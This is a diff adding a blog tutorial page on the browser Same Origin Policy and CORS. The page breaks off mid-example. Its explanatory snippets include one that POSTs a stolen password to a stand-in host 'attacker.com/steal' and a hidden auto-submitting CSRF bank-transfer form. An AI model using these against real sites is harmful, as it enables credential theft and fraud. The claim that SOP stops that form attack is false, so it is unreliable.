@@ -1,0 +1,341 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v5.1.7"><!-- Font preloads --><link rel="preload" href="/mc-blog//fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/mc-blog//fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://mikolajcieszczyk.github.io/mc-blog/blog/same-origin-policy/"><!-- Primary Meta Tags --><title>Same Origin Policy (SOP) - The Foundation of Web Application Security</title><meta name="title" content="Same Origin Policy (SOP) - The Foundation of Web Application Security"><meta name="description" content="Learn about Same Origin Policy, its importance for security, and how to handle cross-origin limitations"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://mikolajcieszczyk.github.io/mc-blog/blog/same-origin-policy/"><meta property="og:title" content="Same Origin Policy (SOP) - The Foundation of Web Application Security"><meta property="og:description" content="Learn about Same Origin Policy, its importance for security, and how to handle cross-origin limitations"><meta property="og:image" content="https://mikolajcieszczyk.github.io/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://mikolajcieszczyk.github.io/mc-blog/blog/same-origin-policy/"><meta property="twitter:title" content="Same Origin Policy (SOP) - The Foundation of Web Application Security"><meta property="twitter:description" content="Learn about Same Origin Policy, its importance for security, and how to handle cross-origin limitations"><meta property="twitter:image" content="https://mikolajcieszczyk.github.io/blog-placeholder-1.jpg"><style>:root{--accent: #2337ff;--accent-dark: #000d8a;--black: 15, 18, 25;--gray: 96, 115, 159;--gray-light: 229, 233, 240;--gray-dark: 34, 41, 57;--gray-gradient: rgba(var(--gray-light), 50%), #fff;--box-shadow: 0 2px 6px rgba(var(--gray), 25%), 0 8px 24px rgba(var(--gray), 33%), 0 16px 32px rgba(var(--gray), 33%)}@font-face{font-family:Atkinson;src:url(/mc-blog//fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/mc-blog//fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;font-size:20px;line-height:1.7;color:rgb(var(--gray-dark));margin:0;padding:0;text-align:left;background:linear-gradient(var(--gray-gradient)) no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:1rem 0;color:rgb(var(--black));line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a{color:var(--accent);&:hover{color:var(--accent)}}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:2px 5px;background-color:rgb(var(--gray-light));border-radius:2px}pre{padding:1.5em;border-radius:8px;white-space:pre-wrap!important;word-wrap:break-word!important;max-width:100%;>code{all:unset;white-space:pre-wrap!important;word-wrap:break-word!important}}blockquote{border-left:4px solid var(--accent);padding:0 0 0 20px;margin:0;font-size:1.333em}hr{border:none;border-top:1px solid rgb(var(--gray-light))}ol,ul,p{margin:8px}ol{padding-left:3rem!important}ul{padding-left:4rem!important}.tldr{border:2px solid #e0e0e0;border-radius:8px;padding:10px 20px;margin:20px 0 60px;background-color:#f8f9fa;box-shadow:var(--box-shadow)}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}footer[data-astro-cid-sz7xmlte]{padding:1em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#fff;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}
+main[data-astro-cid-bvzihdzo]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-bvzihdzo]{width:100%}.hero-image[data-astro-cid-bvzihdzo] img[data-astro-cid-bvzihdzo]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-bvzihdzo]{width:820px;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-bvzihdzo]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-bvzihdzo] h1[data-astro-cid-bvzihdzo]{margin:0 0 .5em}.date[data-astro-cid-bvzihdzo]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <h2 data-astro-cid-3ef6ksr2><a href="/mc-blog/" data-astro-cid-3ef6ksr2>MC Blog</a></h2> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/mc-blog/" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Home </a>  <a href="/mc-blog/blog" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Blog </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://github.com/mikolajcieszczyk" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to my GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="hero-image" data-astro-cid-bvzihdzo> <img width="1020" height="510" src="/mc-blog/same-origin-policy.svg" alt="" data-astro-cid-bvzihdzo> </div> <div class="prose" data-astro-cid-bvzihdzo> <div class="title" data-astro-cid-bvzihdzo> <div class="date" data-astro-cid-bvzihdzo> <time datetime="2025-03-16T00:00:00.000Z"> Mar 16, 2025 </time>  </div> <h1 data-astro-cid-bvzihdzo>Same Origin Policy (SOP) - The Foundation of Web Application Security</h1> <hr data-astro-cid-bvzihdzo> </div>  <p><strong>TLDR:</strong></p>
+<div class="tldr">
+<p><strong>Same Origin Policy (SOP)</strong> is a fundamental security mechanism in browsers that:</p>
+<ol>
+<li>
+<p><strong>Defines “origin”</strong> as a combination of protocol, domain, and port</p>
+<ul>
+<li>Different protocols (http vs https) = different origin</li>
+<li>Different domains (example.com vs api.example.com) = different origin</li>
+<li>Different ports (80 vs 8080) = different origin</li>
+</ul>
+</li>
+<li>
+<p><strong>Restricts interactions</strong> between resources from different origins:</p>
+<ul>
+<li>Blocks access to DOM of other pages</li>
+<li>Limits access to data in Local/Session Storage</li>
+<li>Blocks reading responses from AJAX/fetch requests</li>
+</ul>
+</li>
+<li>
+<p><strong>Provides isolation</strong> between different pages and applications:</p>
+<ul>
+<li>Protects against data theft</li>
+<li>Prevents CSRF attacks</li>
+<li>Isolates JavaScript execution contexts</li>
+</ul>
+</li>
+<li>
+<p><strong>Requires special mechanisms</strong> for cross-origin communication:</p>
+<ul>
+<li>CORS (Cross-Origin Resource Sharing)</li>
+<li>postMessage API</li>
+<li>JSONP (older technique)</li>
+</ul>
+</li>
+</ol>
+</div>
+<h2 id="introduction-to-same-origin-policy">Introduction to Same Origin Policy</h2>
+<p>Same Origin Policy (SOP) is one of the most important security mechanisms in web browsers. It was introduced by Netscape in 1995 as a response to growing threats related to interactions between different websites.</p>
+<p>SOP is the foundation of web application security, preventing unauthorized access to data and resources between different domains. Without this policy, malicious websites could easily steal data from other sites, including users’ confidential information.</p>
+<h2 id="what-is-origin">What is “Origin”?</h2>
+<p>“Origin” is a key concept in Same Origin Policy. Origin is defined as a combination of three elements:</p>
+<ol>
+<li><strong>Protocol</strong> (scheme) - e.g., http, https, ftp</li>
+<li><strong>Domain</strong> (hostname) - e.g., example.com, api.example.com</li>
+<li><strong>Port</strong> - e.g., 80, 443, 8080</li>
+</ol>
+<p>Two resources are considered to be from the same origin only when all three elements are identical.</p>
+<h3 id="examples-of-different-origins">Examples of different origins</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>URL</th><th>Origin</th><th>Same origin as <a href="https://example.com">https://example.com</a>?</th></tr></thead><tbody><tr><td><a href="https://example.com">https://example.com</a></td><td><a href="https://example.com">https://example.com</a></td><td>Yes</td></tr><tr><td><a href="https://example.com:443">https://example.com:443</a></td><td><a href="https://example.com">https://example.com</a></td><td>Yes (port 443 is default for HTTPS)</td></tr><tr><td><a href="http://example.com">http://example.com</a></td><td><a href="http://example.com">http://example.com</a></td><td>No (different protocol)</td></tr><tr><td><a href="https://api.example.com">https://api.example.com</a></td><td><a href="https://api.example.com">https://api.example.com</a></td><td>No (different domain)</td></tr><tr><td><a href="https://example.com:8080">https://example.com:8080</a></td><td><a href="https://example.com:8080">https://example.com:8080</a></td><td>No (different port)</td></tr></tbody></table>
+<h3 id="special-cases">Special cases</h3>
+<ul>
+<li><strong>Subdomains</strong>: api.example.com and example.com are considered different origins, even though they are part of the same main domain.</li>
+<li><strong>IP vs domain</strong>: 192.168.1.1 and example.com pointing to the same server are considered different origins.</li>
+<li><strong>Default ports</strong>: If the port is not specified, the browser uses default ports (80 for HTTP, 443 for HTTPS).</li>
+</ul>
+<h2 id="how-does-same-origin-policy-work">How does Same Origin Policy work?</h2>
+<p>Same Origin Policy restricts interactions between resources from different origins in several key areas:</p>
+<h3 id="1-dom-access">1. DOM Access</h3>
+<p>JavaScript running on one page cannot access the DOM of another page if they come from different origins.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Attempt to access an iframe from a different origin</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> iframe</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"external-frame"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#6A737D">  // This will fail if the iframe is from a different origin</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> iframeDocument</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> iframe.contentDocument;</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(iframeDocument.body.innerHTML);</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (e) {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"No access to iframe from different origin:"</span><span style="color:#E1E4E8">, e);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<h3 id="2-access-to-localsession-storage-data">2. Access to Local/Session Storage data</h3>
+<p>Data stored in Local Storage or Session Storage is only accessible to scripts from the same origin.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Attempt to access Local Storage from a different origin</span></span>
+<span class="line"><span style="color:#F97583">try</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#6A737D">  // This will fail if the script is from a different origin</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> data</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> localStorage.</span><span style="color:#B392F0">getItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"userData"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(data);</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (e) {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"No access to Local Storage from different origin:"</span><span style="color:#E1E4E8">, e);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<h3 id="3-ajaxfetch-requests">3. AJAX/fetch requests</h3>
+<p>By default, AJAX or fetch requests to a different origin are blocked by the browser.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Attempt to make a request to a different origin</span></span>
+<span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"https://api.example.com/data"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">response</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> response.</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">())</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(data))</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">catch</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">error</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> console.</span><span style="color:#B392F0">error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Cross-origin request error:"</span><span style="color:#E1E4E8">, error));</span></span>
+<span class="line"><span style="color:#6A737D">// This request will be blocked unless the server supports CORS</span></span></code></pre>
+<h3 id="4-reading-content-of-images-canvas-and-other-resources">4. Reading content of images, canvas, and other resources</h3>
+<p>JavaScript cannot read the content of images, canvas, or other resources from a different origin.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Attempt to read data from an image from a different origin</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> img</span><span style="color:#F97583"> =</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> Image</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">img.crossOrigin </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "anonymous"</span><span style="color:#E1E4E8">; </span><span style="color:#6A737D">// Attempt to enable CORS for the image</span></span>
+<span class="line"><span style="color:#E1E4E8">img.</span><span style="color:#B392F0">onload</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> () {</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> canvas</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">createElement</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"canvas"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  canvas.width </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> img.width;</span></span>
+<span class="line"><span style="color:#E1E4E8">  canvas.height </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> img.height;</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> ctx</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> canvas.</span><span style="color:#B392F0">getContext</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"2d"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  ctx.</span><span style="color:#B392F0">drawImage</span><span style="color:#E1E4E8">(img, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6A737D">  // This may fail if the server doesn't support CORS for images</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> imageData</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> ctx.</span><span style="color:#B392F0">getImageData</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, canvas.width, canvas.height);</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(imageData);</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">img.src </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "https://example.com/image.jpg"</span><span style="color:#E1E4E8">;</span></span></code></pre>
+<h2 id="why-is-same-origin-policy-important">Why is Same Origin Policy important?</h2>
+<p>Same Origin Policy is a key security mechanism for several reasons:</p>
+<h3 id="1-protection-against-data-theft">1. Protection against data theft</h3>
+<p>Without SOP, a malicious site could load another site in an iframe and steal sensitive data such as passwords, session tokens, or financial information.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#6A737D">&#x3C;!-- A malicious site without SOP could do something like this --></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">iframe</span><span style="color:#B392F0"> src</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"https://bank.com"</span><span style="color:#B392F0"> id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"bank-frame"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">iframe</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#6A737D">  // Without SOP, this would work and steal user data</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> bankFrame</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"bank-frame"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> bankDocument</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> bankFrame.contentDocument;</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> password</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> bankDocument.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">).value;</span></span>
+<span class="line"><span style="color:#6A737D">  // Sending the password to the attacker's server</span></span>
+<span class="line"><span style="color:#B392F0">  fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"https://attacker.com/steal"</span><span style="color:#E1E4E8">, {</span></span>
+<span class="line"><span style="color:#E1E4E8">    method: </span><span style="color:#9ECBFF">"POST"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    body: </span><span style="color:#79B8FF">JSON</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">stringify</span><span style="color:#E1E4E8">({ password }),</span></span>
+<span class="line"><span style="color:#E1E4E8">  });</span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span></code></pre>
+<h3 id="2-prevention-of-csrf-attacks">2. Prevention of CSRF attacks</h3>
+<p>Same Origin Policy helps prevent Cross-Site Request Forgery (CSRF) attacks, which involve executing unauthorized requests on behalf of a logged-in user.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#6A737D">&#x3C;!-- A malicious site without SOP could do something like this --></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">form</span></span>
+<span class="line"><span style="color:#B392F0">  id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"csrf-form"</span></span>
+<span class="line"><span style="color:#B392F0">  action</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"https://bank.com/transfer"</span></span>
+<span class="line"><span style="color:#B392F0">  method</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"POST"</span></span>
+<span class="line"><span style="color:#B392F0">  style</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"display:none;"</span></span>
+<span class="line"><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">  &#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"hidden"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"to"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"attacker"</span><span style="color:#E1E4E8"> /></span></span>
+<span class="line"><span style="color:#E1E4E8">  &#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"hidden"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"amount"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"1000"</span><span style="color:#E1E4E8"> /></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">form</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#6A737D">  // Without SOP, this would work and execute the transfer without user knowledge</span></span>
+<span class="line"><span style="color:#E1E4E8">  document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"csrf-form"</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">submit</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span></code></pre>
+<h3 id="3-isolation-of-javascript-execution-contexts">3. Isolation of JavaScript execution contexts</h3>
+<p>SOP provides isolation between different JavaScript execution contexts, preventing interference between scripts from different sources.</p>
+<h2 id="exceptions-and-workarounds-for-same-origin-policy">Exceptions and workarounds for Same Origin Policy</h2>
+<p>Although Same Origin Policy is a key security mechanism, there are situations where communication between different origins is desired or even necessary. In such cases, there are special mechanisms that allow for secure cross-origin communication.</p>
+<h3 id="1-cross-origin-resource-sharing-cors">1. Cross-Origin Resource Sharing (CORS)</h3>
+<p>CORS is a mechanism that allows servers to specify which origins can access their resources.</p>
+<h4 id="server-side-nodejsexpress-example">Server-side (Node.js/Express example)</h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> express</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> require</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"express"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> app</span><span style="color:#F97583"> =</span><span style="color:#B392F0"> express</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Enabling CORS for a specific origin</span></span>
+<span class="line"><span style="color:#E1E4E8">app.</span><span style="color:#B392F0">use</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">req</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">res</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">next</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">  res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Origin"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"https://trusted-site.com"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Methods"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"GET, POST, OPTIONS"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Headers"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Content-Type, Authorization"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">  next</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Handling OPTIONS requests (preflight)</span></span>
+<span class="line"><span style="color:#E1E4E8">app.</span><span style="color:#B392F0">options</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/api/data"</span><span style="color:#E1E4E8">, (</span><span style="color:#FFAB70">req</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">res</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">  res.</span><span style="color:#B392F0">status</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">200</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">end</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">app.</span><span style="color:#B392F0">get</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/api/data"</span><span style="color:#E1E4E8">, (</span><span style="color:#FFAB70">req</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">res</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">  res.</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">({ data: </span><span style="color:#9ECBFF">"Sensitive data from API"</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">app.</span><span style="color:#B392F0">listen</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">3000</span><span style="color:#E1E4E8">, () </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
